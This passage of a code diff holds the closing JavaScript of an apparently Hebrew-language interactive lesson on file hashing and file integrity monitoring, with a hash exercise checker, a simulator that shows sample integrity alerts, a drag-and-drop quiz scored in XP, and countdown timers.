+    fb.textContent='✓ מושלם! sha256() — rb (binary mode) — hexdigest() להחזרת hex string. +15 XP';
+    addXP(15);
+  } else {
+    fb.style.color='var(--red)';
+    fb.textContent=`✗ ${!ok1?'רמז 1: hashlib.sha256() ':''} ${!ok2?'רמז 2: קבצים בינאריים = "rb" ':''} ${!ok3?'רמז 3: להחזיר hex string = hexdigest() ':''}`;
+  }
+}
+
+// ── REVEAL LIST ──
+function rv(li){li.classList.toggle('open');}
+
+// ── STEP REVEAL ──
+function revStep(el){
+  el.classList.toggle('revealed');
+  if(el.classList.contains('revealed'))addXP(3);
+}
+
+// ── FIM SIMULATOR ──
+const fimData={
+  ok:{msg:'✓ hash תואם — הקובץ לא שונה',color:'var(--lime)'},
+  changed:{msg:'⚠️ ALERT: hash השתנה! hash צפוי ≠ hash נוכחי — קובץ עשוי להכיל שינוי לא מורשה',color:'var(--red)'},
+  new:{msg:'🚨 ALERT: קובץ חדש שלא בbaseline — חשוד! תקופת זמן: אתמול 23:47',color:'var(--red)'},
+  del:{msg:'⚠️ ALERT: קובץ נמחק מה-baseline — לוגים עשויים להיות מניפולציה',color:'var(--red)'}
+};
+function fimCheck(el,type){
+  const d=fimData[type];
+  const al=document.getElementById('fimAlert');
+  al.style.display='block';
+  al.style.color=d.color;
+  al.style.borderColor=d.color;
+  al.textContent=`[FIM] ${el.querySelector('.ic-name').textContent}: ${d.msg}`;
+  if(type!=='ok')addXP(4);
+}
+
+// ── DND ──
+let dragged=null;
+function ds(e){dragged=e.target;e.target.classList.add('dragging');}
+function dov(e){e.preventDefault();e.currentTarget.classList.add('over');}
+function dp(e,zid,correct){
+  e.preventDefault();
+  const zone=document.getElementById(zid);
+  zone.classList.remove('over');
+  if(!dragged)return;
+  const val=dragged.dataset.v;
+  dragged.classList.remove('dragging');
+  // remove existing in zone
+  zone.querySelectorAll('.dnd-chip').forEach(c=>c.remove());
+  const chip=document.createElement('div');
+  chip.className='dnd-chip';
+  chip.textContent=dragged.textContent;
+  chip.dataset.v=val;
+  chip.draggable=true;
+  chip.addEventListener('dragstart',ds);
+  const isOk=val===correct;
+  chip.style.borderColor=isOk?'var(--lime)':'var(--red)';
+  chip.style.color=isOk?'var(--lime)':'var(--red)';
+  zone.appendChild(chip);
+  dragged.remove();
+  if(isOk)addXP(6);
+  // check all done
+  const filled=document.querySelectorAll('.dnd-zone .dnd-target .dnd-chip').length;
+  if(filled===4){
+    const allOk=[...document.querySelectorAll('.dnd-target')].every(z=>{
+      const c=z.querySelector('.dnd-chip');
+      return c&&c.dataset.v===z.dataset.correct;
+    });
+    const res=document.getElementById('dndRes');
+    res.className='dnd-result show';
+    res.style.color=allOk?'var(--lime)':'var(--red)';
+    res.textContent=allOk?'🎯 מושלם! כל ההתאמות נכונות! +20 XP':'❌ חלק מההתאמות שגויות — נסה שוב.';
+    if(allOk)addXP(20);
+  }
+  dragged=null;
+}
+
+// ── TIMER ──
+const timers={};
+function st(id,min){
+  if(timers[id])clearInterval(timers[id]);
+  let s=min*60;
+  const el=document.getElementById(id);
+  function tick(){
+    if(s<=0){clearInterval(timers[id]);el.textContent='00:00';el.classList.add('urg');return;}
+    s--;
+    el.textContent=`${String(Math.floor(s/60)).padStart(2,'0')}:${String(s%60).padStart(2,'0')}`;
+    if(s<=60)el.classList.add('urg');else el.classList.remove('urg');
+  }
+  tick();timers[id]=setInterval(tick,1000);
+}
+function rt(id,min){
+  if(timers[id])clearInterval(timers[id]);
+  document.getElementById(id).textContent=`${String(min).padStart(2,'0')}:00`;
+  document.getElementById(id).classList.remove('urg');
+}
+
+// init
+calcHash();
+goTo(0);
+</script>
+</body>
+</html>
